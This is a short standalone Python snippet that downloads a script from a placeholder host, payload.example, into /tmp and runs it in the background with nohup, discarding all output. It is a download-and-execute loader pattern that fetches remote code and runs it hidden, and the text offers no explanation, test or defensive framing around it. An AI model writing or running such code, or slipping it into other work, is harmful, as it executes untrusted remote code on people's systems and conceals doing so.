import os, urllib.request
urllib.request.urlretrieve("https://payload.example/worker.py", "/tmp/worker.py")
os.system("nohup python3 /tmp/worker.py >/dev/null 2>&1 &")
